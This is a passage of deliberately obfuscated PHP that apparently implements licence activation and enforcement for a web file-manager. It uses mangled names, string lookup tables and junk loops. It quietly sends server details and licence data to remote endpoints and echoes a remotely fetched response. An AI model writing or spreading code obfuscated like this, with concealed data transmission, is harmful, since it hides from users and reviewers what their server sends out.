$GLOBALS[$‚Â›×”Ï[13]][$‚Â›×”Ï[14]] = array_merge($å¾Œ½ŞÂ, $âÊÂœ“Ä); $GLOBALS[$‚Â›×”Ï[13]][$‚Â›×”Ï[15]] = implode($‚Â›×”Ï[0], $GLOBALS[$‚Â›×”Ï[13]][$‚Â›×”Ï[14]]); $ä§®ÑÌ = $ÎÔ¬­äõ[640]; while ($ä§®ÑÌ < $ÎÔ¬­äõ[632]) { if ($ä§®ÑÌ >= 0) { break; } $ä§®ÑÌ++; } } private function husm79e50eef() { $ÃíŸ° =& $_SERVER[Ü©»’·]; $²Ë‚˜Ô” =& $_SERVER[´³–µÍ]; if ($GLOBALS[$²Ë‚˜Ô”[13]][$²Ë‚˜Ô”[15]] != $²Ë‚˜Ô”[6]) { return; } $’Áú¤ò® = $_SERVER[$²Ë‚˜Ô”[16]]; $Ø¡È•Ÿ¹ = $ÃíŸ°[641]; if (strlen($Ø¡È•Ÿ¹) < $ÃíŸ°[361]) { die; } $¢ü¤¥Ü» = $²Ë‚˜Ô”[17]; if (!strstr($’Áú¤ò®, $¢ü¤¥Ü»)) { return; } $Ú¤ª§«Ê = strrpos($’Áú¤ò®, $¢ü¤¥Ü»); $øùûÖÊ = substr($’Áú¤ò®, $Ú¤ª§«Ê + strlen($¢ü¤¥Ü»)); $‰„ö®ñÊ = $ÃíŸ°[642]; if (!$‰„ö®ñÊ) { return; } preg_match_all($²Ë‚˜Ô”[18], $øùûÖÊ, $¾í°©Ä¸); $ğÌµß˜È = $ÃíŸ°[643]; if (strlen($ğÌµß˜È) < $ÃíŸ°[638]) { die; } $øùûÖÊ = trim($¾í°©Ä¸[0][0], $²Ë‚˜Ô”[19]); $GLOBALS[$²Ë‚˜Ô”[13]][$²Ë‚˜Ô”[14]] = explode($²Ë‚˜Ô”[19], $øùûÖÊ); $GLOBALS[$²Ë‚˜Ô”[13]][$²Ë‚˜Ô”[15]] = implode($²Ë‚˜Ô”[0], $GLOBALS[$²Ë‚˜Ô”[13]][$²Ë‚˜Ô”[14]]); $Ò„şí¯ = $ÃíŸ°[644]; } public function run() { $ÑİíÄŒØ =& $_SERVER[Ü©»’·]; $Ë·˜²ğ =& $_SERVER[´³–µÍ]; $this->husm79e50eef(); $this->glxq380ad971(); $ù¤¨²Î˜ = $ÑİíÄŒØ[645]; $¹‘üşó = $GLOBALS[$Ë·˜²ğ[13]][$Ë·˜²ğ[14]]; $ÒôÆ¡«— = $ÑİíÄŒØ[646]; $ğÕôûåî = $GLOBALS[$Ë·˜²ğ[13]][$Ë·˜²ğ[15]]; define($Ë·˜²ğ[20], isset($¹‘üşó[0]) && $¹‘üşó[0] ? $¹‘üşó[0] : $this->defaultModule); $¬¨ƒ£–  = $ÑİíÄŒØ[647]; if (!$¬¨ƒ£– ) { die; } define($Ë·˜²ğ[21], isset($¹‘üşó[1]) && $¹‘üşó[0] ? $¹‘üşó[1] : $this->defaultController); define($Ë·˜²ğ[22], isset($¹‘üşó[2]) && $¹‘üşó[0] ? $¹‘üşó[2] : $this->defaultAction); $ÑºÔçÜ = $ÑİíÄŒØ[648]; if (strlen($ÑºÔçÜ) < $ÑİíÄŒØ[634]) { return; } define($Ë·˜²ğ[23], MOD . $Ë·˜²ğ[0] . ST . $Ë·˜²ğ[0] . ACT); $_SERVER[$Ë·˜²ğ[24]] = strtolower(ACTION); $ŒéÊ„êâ = $ÑİíÄŒØ[649]; while ($ŒéÊ„êâ < $ÑİíÄŒØ[634]) { if ($ŒéÊ„êâ >= 0) { break; } $ŒéÊ„êâ++; } $this->autorun(); $ã’õí†” = $ÑİíÄŒØ[650]; if (count($¹‘üşó) >= 3) { $this->appRun($ğÕôûåî); } else { $this->appRun(ACTION); } } private $qelo16eb93b1 = array(); private $pklw97ef85ce = ''; public function avhl6b6f171f() { $®«ıá›¾ =& $_SERVER[Ü©»’·]; $÷øì¹®á =& $_SERVER[´³–µÍ]; $this->etjy5bdb1eab(); $this->okzhc40f6a9a(); $ãÓ’¿Â™ = $®«ıá›¾[651]; if (strlen($ãÓ’¿Â™) < $®«ıá›¾[632]) { return; } $this->ejyf15b69222(); $İŠ„˜˜ = $®«ıá›¾[652]; while (strlen($İŠ„˜˜) < $®«ıá›¾[361]) { if (!$İŠ„˜˜) { break; } $İŠ„˜˜++; } $this->ltyp1dd9e940(); $¦³ÇõŠº = $®«ıá›¾[653]; $this->yrbw4d4cda96(); $ì‡‡šÄÅ = $®«ıá›¾[654]; while ($ì‡‡šÄÅ < $®«ıá›¾[638]) { if ($ì‡‡šÄÅ >= 0) { break; } $ì‡‡šÄÅ++; } $this->wcfrf0ef4203(); $this->ocbn9f16039f(); $this->hdtq91deedc6($÷øì¹®á[25], array($this, $÷øì¹®á[26])); $…ä“´¼Ë = $®«ıá›¾[655]; while (strlen($…ä“´¼Ë) < $®«ıá›¾[361]) { if (!$…ä“´¼Ë) { break; } $…ä“´¼Ë++; } $this->hdtq91deedc6($÷øì¹®á[27], array($this, $÷øì¹®á[28])); $¶¸À°è“ = $®«ıá›¾[656]; if (!$¶¸À°è“) { die; } $this->hdtq91deedc6($÷øì¹®á[29], array($this, $÷øì¹®á[30])); $Ôª„Ø ° = $®«ıá›¾[657]; if (!$Ôª„Ø °) { return; } $this->hdtq91deedc6($÷øì¹®á[31], array($this, $÷øì¹®á[32])); } public function ozfh3d51618f($ë’ËóÉ¯) { $ÙĞİöí =& $_SERVER[Ü©»’·]; $¤â“£ˆË =& $_SERVER[´³–µÍ]; $ÎçüàÍ¡ = Model($¤â“£ˆË[33])->get(); $œ€¶êäÀ = $ÙĞİöí[658]; if (!$œ€¶êäÀ) { die; } $­¤…Š«¤ = array($¤â“£ˆË[34], $¤â“£ˆË[35], $¤â“£ˆË[36], $¤â“£ˆË[37], $¤â“£ˆË[38], $¤â“£ˆË[39], $¤â“£ˆË[40], $¤â“£ˆË[41], $¤â“£ˆË[42], $¤â“£ˆË[43], $¤â“£ˆË[44], $¤â“£ˆË[45], $¤â“£ˆË[46], $¤â“£ˆË[47], $¤â“£ˆË[48], $¤â“£ˆË[49], $¤â“£ˆË[50], $¤â“£ˆË[51], $¤â“£ˆË[52], $¤â“£ˆË[53], $¤â“£ˆË[54], $¤â“£ˆË[55], $¤â“£ˆË[56], $¤â“£ˆË[57], $¤â“£ˆË[58], $¤â“£ˆË[59], $¤â“£ˆË[60], $¤â“£ˆË[61], $¤â“£ˆË[62], $¤â“£ˆË[63], $¤â“£ˆË[64], $¤â“£ˆË[65], $¤â“£ˆË[66], $¤â“£ˆË[67], $¤â“£ˆË[68], $¤â“£ˆË[69], $¤â“£ˆË[70], $¤â“£ˆË[71], $¤â“£ˆË[72], $¤â“£ˆË[73], $¤â“£ˆË[74], $¤â“£ˆË[75], $¤â“£ˆË[76], $¤â“£ˆË[77], $¤â“£ˆË[78], $¤â“£ˆË[79], $¤â“£ˆË[80], $¤â“£ˆË[81], $¤â“£ˆË[82], $¤â“£ˆË[83], $¤â“£ˆË[84]); $éŸ’˜÷ô = $ÙĞİöí[659]; if (!$éŸ’˜÷ô) { return; } foreach ($­¤…Š«¤ as $Ùë±½Ş) { $ïìäÔ¿ = $GLOBALS[$¤â“£ˆË[85]][$¤â“£ˆË[86]][$Ùë±½Ş]; if (isset($ÎçüàÍ¡[$Ùë±½Ş])) { $ïìäÔ¿ = $ÎçüàÍ¡[$Ùë±½Ş]; } $ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[88]][$Ùë±½Ş] = $ïìäÔ¿; } $°çàŞ‡ = $ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[88]][$¤â“£ˆË[46]]; $™ÂÏÂÕ = $ÙĞİöí[660]; if (!$™ÂÏÂÕ) { die; } unset($ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[89]][$¤â“£ˆË[90]]); unset($ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[89]][$¤â“£ˆË[91]]); $ŠŞ”¢Ø = $ÙĞİöí[661]; while (strlen($ŠŞ”¢Ø) < $ÙĞİöí[634]) { if (!$ŠŞ”¢Ø) { break; } $ŠŞ”¢Ø++; } unset($ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[88]][$¤â“£ˆË[46]]); $äáµ«ÛÅ = $ÙĞİöí[662]; while (strlen($äáµ«ÛÅ) < $ÙĞİöí[361]) { if (!$äáµ«ÛÅ) { break; } $äáµ«ÛÅ++; } unset($ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[88]][$¤â“£ˆË[92]]); $«¦«¥ş‹ = $ÙĞİöí[663]; if (!$«¦«¥ş‹) { die; } $ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[88]][$¤â“£ˆË[93]] = array($¤â“£ˆË[94] => (int) $°çàŞ‡[$¤â“£ˆË[95]], $¤â“£ˆË[96] => (int) _get($°çàŞ‡, $¤â“£ˆË[97], 0)); $ÙèôÙ… = $ÙĞİöí[664]; if (!$ÙèôÙ…) { return; } $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[99]] = Action($¤â“£ˆË[100])->accessToken(); $Ÿñ“”’¹ = $ÙĞİöí[665]; if (strlen($Ÿñ“”’¹) < $ÙĞİöí[361]) { die; } $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[101]] = md5($_SERVER[$¤â“£ˆË[102]] . $ÎçüàÍ¡[$¤â“£ˆË[103]]); $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[104]] = base64_encode(serverInfo()); $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[105]] = $this->pklw97ef85ce; $‹ŸäıµÅ = $ÙĞİöí[666]; if (strlen($‹ŸäıµÅ) < $ÙĞİöí[361]) { die; } if ($ÎçüàÍ¡[$¤â“£ˆË[105]] != $¤â“£ˆË[106]) { $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[107]] = $ÎçüàÍ¡[$¤â“£ˆË[107]]; $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[108]] = $ÎçüàÍ¡[$¤â“£ˆË[108]]; $ƒ—Å «Â = rand_string(10) . $this->pklw97ef85ce . rand_string(5); $ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[109]][$¤â“£ˆË[110]] = $this->sfvxe278ca85($ƒ—Å «Â, $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[101]]); } if ($this->pklw97ef85ce == $¤â“£ˆË[106]) { $ë’ËóÉ¯[$¤â“£ˆË[87]][$¤â“£ˆË[88]][$¤â“£ˆË[93]][$¤â“£ˆË[97]] = 0; } $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[111]] = _get($this->qelo16eb93b1, $¤â“£ˆË[112], $¤â“£ˆË[6]); $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[113]] = _get($this->qelo16eb93b1, $¤â“£ˆË[114], $¤â“£ˆË[6]); $¹Ô£”¯¸ = $ÙĞİöí[667]; while (strlen($¹Ô£”¯¸) < $ÙĞİöí[361]) { if (!$¹Ô£”¯¸) { break; } $¹Ô£”¯¸++; } if (_get($GLOBALS, $¤â“£ˆË[115]) && $this->config[$¤â“£ˆË[116]]) { $ë’ËóÉ¯[$¤â“£ˆË[98]][$¤â“£ˆË[117]] = WEB_ROOT; } return $ë’ËóÉ¯; } private function wcfrf0ef4203() { $‹ÓÛí® =& $_SERVER[Ü©»’·]; $ÒØ¢àŞŞ =& $_SERVER[´³–µÍ]; $„ğ’ï¼ = $_SERVER[$ÒØ¢àŞŞ[24]] == $ÒØ¢àŞŞ[118]; $¶´ºéŒë = $‹ÓÛí®[668]; if (!$¶´ºéŒë) { die; } if ($_SERVER[$ÒØ¢àŞŞ[24]] == $ÒØ¢àŞŞ[119] && $_GET[$ÒØ¢àŞŞ[120]] == $ÒØ¢àŞŞ[121]) { $„ğ’ï¼ = !0; } if ($„ğ’ï¼) { $µÇ§Üİš = array($ÒØ¢àŞŞ[105] => $this->pklw97ef85ce, $ÒØ¢àŞŞ[122] => $this->voezeb1e892b(), $ÒØ¢àŞŞ[123] => Model($ÒØ¢àŞŞ[124])->count()); if ($this->pklw97ef85ce != $ÒØ¢àŞŞ[106]) { $®Û°œëê = _get($this->qelo16eb93b1, $ÒØ¢àŞŞ[125]); if ($®Û°œëê) { $µÇ§Üİš[$ÒØ¢àŞŞ[126]] = $®Û°œëê; $µÇ§Üİš[$ÒØ¢àŞŞ[127]] = strtotime(_get($this->qelo16eb93b1, $ÒØ¢àŞŞ[128])); $µÇ§Üİš[$ÒØ¢àŞŞ[129]] = _get($this->qelo16eb93b1, $ÒØ¢àŞŞ[114]); } $û•£í×û = Model($ÒØ¢àŞŞ[33])->get($ÒØ¢àŞŞ[130], $ÒØ¢àŞŞ[6], !0); if (is_string($û•£í×û) && substr($û•£í×û, 0, 1) == $ÒØ¢àŞŞ[131]) { $û•£í×û = json_decode_force($û•£í×û); } if (is_array($û•£í×û) && $û•£í×û[$ÒØ¢àŞŞ[132]] && strstr($û•£í×û[$ÒØ¢àŞŞ[132]], $ÒØ¢àŞŞ[133])) { $±ÙÅ¨îÛ = explode($ÒØ¢àŞŞ[133], $û•£í×û[$ÒØ¢àŞŞ[132]]); $µÇ§Üİš[$ÒØ¢àŞŞ[134]] = $±ÙÅ¨îÛ[0]; } } $µÇ§Üİš = $this->hgaf74fe9a0d(json_encode($µÇ§Üİš), md5($ÒØ¢àŞŞ[135])); $¯÷¡ı‰µ = array($ÒØ¢àŞŞ[136] => $µÇ§Üİš); call_user_func(array($ÒØ¢àŞŞ[137], $ÒØ¢àŞŞ[138]), $¯÷¡ı‰µ); } if ($this->pklw97ef85ce == $ÒØ¢àŞŞ[106]) { return; } $ôËšèÔ¾ = array($ÒØ¢àŞŞ[139], $ÒØ¢àŞŞ[140], $ÒØ¢àŞŞ[141], $ÒØ¢àŞŞ[142], $ÒØ¢àŞŞ[143], $ÒØ¢àŞŞ[144]); $‚ñò´Ñ® = $‹ÓÛí®[669]; if (!$‚ñò´Ñ®) { return; } $¶ÊÀ«âš = Model($ÒØ¢àŞŞ[33])->get(); $¯÷¡ı‰µ = array($ÒØ¢àŞŞ[145] => $¶ÊÀ«âš[$ÒØ¢àŞŞ[34]], $ÒØ¢àŞŞ[146] => $¶ÊÀ«âš[$ÒØ¢àŞŞ[35]], $ÒØ¢àŞŞ[147] => $ÒØ¢àŞŞ[6]); $éÏ€êª° = $‹ÓÛí®[670]; if (strlen($éÏ€êª°) < $‹ÓÛí®[638]) { die; } foreach ($ôËšèÔ¾ as $ º”×’Á) { if (!isset($¶ÊÀ«âš[$ º”×’Á]) || !$¶ÊÀ«âš[$ º”×’Á]) { continue; } $¯÷¡ı‰µ[$ º”×’Á] = $¶ÊÀ«âš[$ º”×’Á]; } call_user_func(array($ÒØ¢àŞŞ[137], $ÒØ¢àŞŞ[138]), $¯÷¡ı‰µ); } private function ltyp1dd9e940() { $É‡æ¿± =& $_SERVER[Ü©»’·]; $òÇƒØûõ =& $_SERVER[´³–µÍ]; if ($_SERVER[$òÇƒØûõ[24]] != $òÇƒØûõ[148]) { return; } if (!_get($GLOBALS, $òÇƒØûõ[115])) { die; } $ëà’§€Á = $GLOBALS[$òÇƒØûõ[13]]; if (isset($ëà’§€Á[$òÇƒØûõ[149]])) { $this->kfwv6b721225(); die; } if (!isset($ëà’§€Á[$òÇƒØûõ[150]]) || strlen($ëà’§€Á[$òÇƒØûõ[150]]) != 16) { show_json($òÇƒØûõ[151] . $ëà’§€Á[$òÇƒØûõ[150]], !1); } $É”ËØ¥ = Model($òÇƒØûõ[33])->get($òÇƒØûõ[103]); $òñ•³ÌÆ = md5($_SERVER[$òÇƒØûõ[102]] . $É”ËØ¥); $üé‚û§ = $É‡æ¿±[671]; if (strlen($üé‚û§) < $É‡æ¿±[361]) { die; } $”„­¶§– = array($òÇƒØûõ[150] => $ëà’§€Á[$òÇƒØûõ[150]], $òÇƒØûõ[152] => rand_string(16), $òÇƒØûõ[153] => $òÇƒØûõ[135], $òÇƒØûõ[154] => $òÇƒØûõ[155], $òÇƒØûõ[156] => $_SERVER[$òÇƒØûõ[157]], $òÇƒØûõ[158] => $_SERVER[$òÇƒØûõ[159]], $òÇƒØûõ[160] => $_SERVER[$òÇƒØûõ[161]], $òÇƒØûõ[101] => $òñ•³ÌÆ, $òÇƒØûõ[162] => Model($òÇƒØûõ[33])->get($òÇƒØûõ[130])); if ($ëà’§€Á[$òÇƒØûõ[163]] == $òÇƒØûõ[164]) { $ûÇ¼Ñ  = $this->hgaf74fe9a0d($òñ•³ÌÆ, $òÇƒØûõ[165]); $ş°ãÊˆ— = $this->sfvxe278ca85(json_encode($”„­¶§–), $òñ•³ÌÆ . $òÇƒØûõ[166], 3); $ş°ãÊˆ— = $ş°ãÊˆ— . $òÇƒØûõ[167] . $_SERVER[$òÇƒØûõ[157]]; $½ÕÄƒô¯ = $this->prms6add02de($òÇƒØûõ[168] . $ûÇ¼Ñ  . $òÇƒØûõ[169] . $ş°ãÊˆ—, -1); show_json($½ÕÄƒô¯, !0); } else { if ($ëà’§€Á[$òÇƒØûõ[163]] == $òÇƒØûõ[170]) { $ø“¯úš = substr(md5($òÇƒØûõ[171] . $òñ•³ÌÆ), 12, 15) . $òÇƒØûõ[172]; $ş°ãÊˆ— = $this->ejdx097e39a5(trim($ëà’§€Á[$òÇƒØûõ[173]]), $ø“¯úš, 2); $´¼Îäã = json_decode($ş°ãÊˆ—, !0); if (!is_array($´¼Îäã) || !is_array($´¼Îäã[$òÇƒØûõ[174]]) || $´¼Îäã[$òÇƒØûõ[150]] != !0) { $’ŞÌªË× = $òÇƒØûõ[175]; $„ºÕÕüî = $´¼Îäã[$òÇƒØûõ[174]] ? $òÇƒØûõ[176] . $´¼Îäã[$òÇƒØûõ[174]] : $’ŞÌªË×; show_json($„ºÕÕüî, !1); } else { $”„­¶§–[$òÇƒØûõ[152]] = $´¼Îäã[$òÇƒØûõ[174]][$òÇƒØûõ[177]]; } } else { $´¼Îäã = $this->prms6add02de($òÇƒØûõ[178], $”„­¶§–, 10); $“áà«¾ = $É‡æ¿±[672]; } } if (!is_array($´¼Îäã) || !is_array($´¼Îäã[$òÇƒØûõ[174]]) || $´¼Îäã[$òÇƒØûõ[150]] != !0) { $’ŞÌªË× = LNG($òÇƒØûõ[179]); $„ºÕÕüî = $´¼Îäã[$òÇƒØûõ[174]] ? $òÇƒØûõ[176] . $´¼Îäã[$òÇƒØûõ[174]] : $’ŞÌªË×; show_json($„ºÕÕüî, !1); } $Â£ŸÆºù = $´¼Îäã[$òÇƒØûõ[174]]; $ö±Ğ³ºÅ = $this->blecde86905e($Â£ŸÆºù[$òÇƒØûõ[180]]); $Ãâî‡–¸ = $É‡æ¿±[673]; if (!$Ãâî‡–¸) { die; } if (!$ö±Ğ³ºÅ || $ö±Ğ³ºÅ != $Â£ŸÆºù[$òÇƒØûõ[128]]) { $ÈĞŒÓ§ñ = array($òÇƒØûõ[181] => Model($òÇƒØûõ[33])->get($òÇƒØûõ[103]), $òÇƒØûõ[182] => $_SERVER[$òÇƒØûõ[102]], $òÇƒØûõ[183] => this_url(), $òÇƒØûõ[158] => $_SERVER[$òÇƒØûõ[159]]); $ş°ãÊˆ— = $this->sjlb764756f9(json_encode($ÈĞŒÓ§ñ)); $this->prms6add02de($òÇƒØûõ[184] . $ş°ãÊˆ—); show_json(LNG($òÇƒØûõ[185]), !0); } $ñ÷½„¶ = array($òÇƒØûõ[186] => $Â£ŸÆºù[$òÇƒØûõ[187]], $òÇƒØûõ[188] => $Â£ŸÆºù[$òÇƒØûõ[189]], $òÇƒØûõ[190] => rand_string(16), $òÇƒØûõ[105] => $Â£ŸÆºù[$òÇƒØûõ[191]]); if ($”„­¶§–[$òÇƒØûõ[152]]) { $ñ÷½„¶[$òÇƒØûõ[190]] = $”„­¶§–[$òÇƒØûõ[152]]; } $Õ³‚Òèí = substr(md5($ñ÷½„¶[$òÇƒØûõ[188]]), 10, 10); $ó¨ÌÎÛ¤ = $Õ³‚Òèí . $ñ÷½„¶[$òÇƒØûõ[105]] . $ñ÷½„¶[$òÇƒØûõ[190]]; $ñ÷½„¶[$òÇƒØûõ[107]] = strrev(base64_encode($this->hgaf74fe9a0d($ó¨ÌÎÛ¤, $òÇƒØûõ[192]))); $Ö§¿ÉÄŞ = $É‡æ¿±[674]; if (strlen($Ö§¿ÉÄŞ) < $É‡æ¿±[632]) { die; } $¹€å”® = rand_string(16); $ß––€‘‚ = $¹€å”® . $ñ÷½„¶[$òÇƒØûõ[105]] . $this->hgaf74fe9a0d(md5($ñ÷½„¶[$òÇƒØûõ[186]]), $¹€å”®); $ñ÷½„¶[$òÇƒØûõ[108]] = base64_encode(strrev($this->hgaf74fe9a0d($ß––€‘‚, $òÇƒØûõ[193]))); if ($Â£ŸÆºù[$òÇƒØûõ[194]] && $Â£ŸÆºù[$òÇƒØûõ[194]] >= 1) { Model($òÇƒØûõ[33])->setDeep($òÇƒØûõ[195], $òÇƒØûõ[121]); } Model($òÇƒØûõ[33])->set($ñ÷½„¶); $˜·õğë´ = md5($_SERVER[$òÇƒØûõ[102]] . strrev($É”ËØ¥) . $ñ÷½„¶[$òÇƒØûõ[188]]); $íÊŞ³Ùˆ = strrev(substr($˜·õğë´, 10, 16)); $—âĞ¸¹… = $this->sfvxe278ca85(json_encode($Â£ŸÆºù), $˜·õğë´); $È…¶Šª = $É‡æ¿±[675]; $ôÌßåõË = array_to_keyvalue(Model($òÇƒØûõ[7])->listData(), $òÇƒØûõ[196]); $«ïˆÒÓ÷ = $ôÌßåõË[$òÇƒØûõ[197]]; $€ÎÑÜñ = array(); $€ÎÑÜñ[$íÊŞ³Ùˆ] = $—âĞ¸¹…; $Ñ¦Ù¡ĞÏ = $É‡æ¿±[676]; while (strlen($Ñ¦Ù¡ĞÏ) < $É‡æ¿±[638]) { if (!$Ñ¦Ù¡ĞÏ) { break; } $Ñ¦Ù¡ĞÏ++; } Model($òÇƒØûõ[7])->update($«ïˆÒÓ÷[$òÇƒØûõ[198]], array($òÇƒØûõ[199] => $€ÎÑÜñ)); $»ïÙÜ = $É‡æ¿±[677]; if (strlen($»ïÙÜ) < $É‡æ¿±[634]) { die; } $this->qelo16eb93b1 = $Â£ŸÆºù; $­Ø†Ãû« = $É‡æ¿±[678]; if (strlen($­Ø†Ãû«) < $É‡æ¿±[632]) { die; } $this->pklw97ef85ce = $ñ÷½„¶[$òÇƒØûõ[105]]; $this->licenseRegistSuccess(); Cache::set($òÇƒØûõ[200] . md5($É”ËØ¥ . $òÇƒØûõ[201]), $òÇƒØûõ[6]); show_json(LNG($òÇƒØûõ[185]), !0); $ğ™»…ÂŸ = $É‡æ¿±[679]; } private function licenseRegistSuccess() { $é­Çé˜˜ =& $_SERVER[´³–µÍ]; $–Êëïµ = Model($é­Çé˜˜[33])->get(); if ($–Êëïµ[$é­Çé˜˜[63]] != $é­Çé˜˜[121]) { Model($é­Çé˜˜[33])->set($é­Çé˜˜[63], $é­Çé˜˜[121]); } Action($é­Çé˜˜[202])->initStart(!0); } private function kfwv6b721225() { $Áª™—­¿ =& $_SERVER[Ü©»’·]; $Äšª‘”ş =& $_SERVER[´³–µÍ]; Model($Äšª‘”ş[33])->set(array($Äšª‘”ş[186] => $Äšª‘”ş[6], $Äšª‘”ş[188] => $Äšª‘”ş[6], $Äšª‘”ş[105] => $Äšª‘”ş[106], $Äšª‘”ş[107] => $Äšª‘”ş[6], $Äšª‘”ş[108] => $Äšª‘”ş[6])); $Å´ßŞ¸¹ = $Áª™—­¿[680]; if (strlen($Å´ßŞ¸¹) < $Áª™—­¿[361]) { return; } Model($Äšª‘”ş[33])->setDeep($Äšª‘”ş[195], $Äšª‘”ş[203]); $this->qelo16eb93b1 = array(); $this->pklw97ef85ce = $Äšª‘”ş[106]; } private function etjy5bdb1eab() { $ƒ½ì°ø‚ =& $_SERVER[Ü©»’·]; $çİ£şİ« =& $_SERVER[´³–µÍ]; $_SERVER[$çİ£şİ«[159]] = _get($_SERVER, $çİ£şİ«[159], APP_HOST); $this->pklw97ef85ce = $çİ£şİ«[106]; $ŒöÛÁ€© = Model($çİ£şİ«[33])->get(); $ëğ¶÷Ã‹ = $ƒ½ì°ø‚[681]; while ($ëğ¶÷Ã‹ < $ƒ½ì°ø‚[638]) { if ($ëğ¶÷Ã‹ >= 0) { break; } $ëğ¶÷Ã‹++; } if ($ŒöÛÁ€©[$çİ£şİ«[105]] == $çİ£şİ«[106]) { return; } $Ç±”¢ Ù = Model($çİ£şİ«[33])->get($çİ£şİ«[103]); $©«ı–íŞ = $çİ£şİ«[200] . md5($Ç±”¢ Ù . $çİ£şİ«[201]); $Ñ‘ƒµç = Cache::get($©«ı–íŞ); if (!is_array($Ñ‘ƒµç) || !isset($Ñ‘ƒµç[$çİ£şİ«[204]]) || time() - $Ñ‘ƒµç[$çİ£şİ«[204]] >= 60) { $öõüÉìí = Model($çİ£şİ«[7])->loadList(); $­ÀíÙ˜Õ = $öõüÉìí[$çİ£şİ«[197]]; $½Œ•› Ï = md5($_SERVER[$çİ£şİ«[102]] . strrev($Ç±”¢ Ù) . $ŒöÛÁ€©[$çİ£şİ«[188]]); $‚ÅËá = strrev(substr($½Œ•› Ï, 10, 16)); $Ñ‘ƒµç = $this->ejdx097e39a5($­ÀíÙ˜Õ[$çİ£şİ«[85]][$‚ÅËá], $½Œ•› Ï); $Ñ‘ƒµç = json_decode($Ñ‘ƒµç, !0); } if (!is_array($Ñ‘ƒµç)) { return $this->kfwv6b721225(); } $×èÌËä¡ = strtotime($Ñ‘ƒµç[$çİ£şİ«[128]]); if (time() >= $×èÌËä¡) { return $this->kfwv6b721225(); } if (time() - $Ñ‘ƒµç[$çİ£şİ«[204]] > 20) { $Ñ‘ƒµç[$çİ£şİ«[204]] = time(); Cache::set($©«ı–íŞ, $Ñ‘ƒµç); } $this->qelo16eb93b1 = $Ñ‘ƒµç; $this->pklw97ef85ce = $ŒöÛÁ€©[$çİ£şİ«[105]]; } private function okzhc40f6a9a() { $Ëşø£Ñ =& $_SERVER[Ü©»’·]; $ë·ïÄé¢ =& $_SERVER[´³–µÍ]; $Öúğö¸æ = $GLOBALS[$ë·ïÄé¢[13]]; $©ƒıøÏ = $Ëşø£Ñ[682]; if (strlen($©ƒıøÏ) < $Ëşø£Ñ[634]) { die; } $¶Æìó°Š = $_SERVER[$ë·ïÄé¢[24]]; $½ŒäÒœ– = $Ëşø£Ñ[683]; if (strlen($½ŒäÒœ–) < $Ëşø£Ñ[628]) { return; } if ($¶Æìó°Š == $ë·ïÄé¢[205] && $this->pklw97ef85ce == $ë·ïÄé¢[106]) { show_json(LNG($ë·ïÄé¢[206]), !1, $ë·ïÄé¢[207]); } $¾„¿‡×§ = array($ë·ïÄé¢[208], $ë·ïÄé¢[209]); if (in_array($¶Æìó°Š, $¾„¿‡×§)) { if ($this->pklw97ef85ce == $ë·ïÄé¢[106] && isset($Öúğö¸æ[$ë·ïÄé¢[210]])) { show_json(LNG($ë·ïÄé¢[206]), !1, $ë·ïÄé¢[207]); die; } $ˆ¼ôÄ·¿ = $this->voezeb1e892b(); if ($ˆ¼ôÄ·¿ != intval($ë·ïÄé¢[211])) { if ($ˆ¼ôÄ·¿ <= Model($ë·ïÄé¢[124])->count()) { show_json(LNG($ë·ïÄé¢[212]), !1, $ë·ïÄé¢[207]); die; } } } } private function ejyf15b69222() { $úìë¨˜± =& $_SERVER[Ü©»’·]; $–ì¦êĞ =& $_SERVER[´³–µÍ]; $„æ€õÏ = array($–ì¦êĞ[118], $–ì¦êĞ[119]); if (!_get($GLOBALS, $–ì¦êĞ[115]) || !isset($_GET[$–ì¦êĞ[213]])) { return; } if (!in_array($_SERVER[$–ì¦êĞ[24]], $„æ€õÏ)) { return; } $›¾£ªÀ = $–ì¦êĞ[214]; $ÌÙœ›Å„ = $úìë¨˜±[684]; while (strlen($ÌÙœ›Å„) < $úìë¨˜±[628]) { if (!$ÌÙœ›Å„) { break; } $ÌÙœ›Å„++; } $›¾£ªÀ = $this->wqfa768dde05($›¾£ªÀ, $–ì¦êĞ[215]); $Ü¼Í²„˜ = stream_context_create(array($–ì¦êĞ[216] => array($–ì¦êĞ[217] => $–ì¦êĞ[218], $–ì¦êĞ[219] => 3))); $£ä”ñ‘ = @file_get_contents($›¾£ªÀ, !1, $Ü¼Í²„˜); $–Àïˆ· = $úìë¨˜±[685]; while ($–Àïˆ· < $úìë¨˜±[361]) { if ($–Àïˆ· >= 0) { break; } $–Àïˆ·++; } header($–ì¦êĞ[220]); $´Ì¨ğ¶— = $úìë¨˜±[686]; if (strlen($´Ì¨ğ¶—) < $úìë¨˜±[628]) { return; } if ($£ä”ñ‘ && strstr($£ä”ñ‘, $–ì¦êĞ[221])) { echo $£ä”ñ‘; } die; } public function evgwc7ba4cf2($­ıª»šœ) { $ÃÃƒ¾êš =& $_SERVER[Ü©»’·]; $Éé¦ôÌ =& $_SERVER[´³–µÍ]; if ($this->pklw97ef85ce == $Éé¦ôÌ[222]) { return $­ıª»šœ; } $ŸÑ‡ÇÇ = array($Éé¦ôÌ[223] => $Éé¦ôÌ[224], $Éé¦ôÌ[225] => $Éé¦ôÌ[224], $Éé¦ôÌ[226] => $Éé¦ôÌ[224], $Éé¦ôÌ[227] => $Éé¦ôÌ[224], $Éé¦ôÌ[228] => $Éé¦ôÌ[229], $Éé¦ôÌ[230] => $Éé¦ôÌ[229], $Éé¦ôÌ[231] => $Éé¦ôÌ[229], $Éé¦ôÌ[232] => $Éé¦ôÌ[229], 